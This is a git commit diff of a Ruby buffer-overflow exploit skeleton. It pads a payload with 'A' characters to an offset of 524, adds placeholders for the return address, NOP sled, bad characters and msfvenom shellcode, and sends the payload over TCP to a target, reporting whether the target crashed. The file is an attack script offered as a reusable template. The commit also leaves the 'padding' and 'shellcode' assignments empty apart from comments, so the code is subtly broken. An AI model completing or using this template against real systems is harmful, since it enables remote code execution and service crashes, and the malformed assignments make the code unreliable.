fc02cbe311d2b152ef3374ac4da18a5265cf5dab
Mohannad <160382321+BypassASLR@users.noreply.github.com>
2024-02-18 21:16:45 +0000

    skeleton.rb

--- skeleton.rb
+++ skeleton.rb
@@ -3,41 +3,48 @@
 require 'socket' 
 
 host = ""
-port = 
+port = 0
 
 buffer = "A" 
 
-offset = 0
+offset = 524
 
 overflow = buffer * offset
 
 retn = "" 
 
-eip = "" # The EIP / Return Address make sure to type it backwards and correctly 
+eip = "" # The EIP / Return Address 
 
-padding = "" # NOPs , at least 16 example : "\x90" * 16
+padding =  # NOPs , at least 16 example : "\x90" * 16
 
 badchars = "" # the bad characters , you can find it here https://github.com/cytopia/badchars
  
-shellcode = "" # the msfvenom shell code that you generated   
+shellcode = # the msfvenom shell code that you generated   
 
-
-
-payload = overflow + retn + eip + padding + badchars + shellcode 
+payload = overflow + retn + eip + padding + badchars + shellcode
 
 payload += "\r\n"
 
-s = TCPSocket.open(host, port)
 
-s.send(payload, 0) 
+begin
+  
+  s = TCPSocket.open(host, port)
 
-puts " Sending Exploit #{payload.size} bytes "
+  s.send(payload, 0)
 
-s.recv(1024)
+  puts " Sending Exploit #{payload.size} bytes "
 
-s.close()
+  s.recv(1024)
+
+  s.close()
 
 
+rescue Errno::ECONNREFUSED
+  puts "Target Offline"
+  exit!
 
+rescue Errno::ECONNRESET
+  puts "Target Crashed or Offline"
+  exit!
+end
  
-
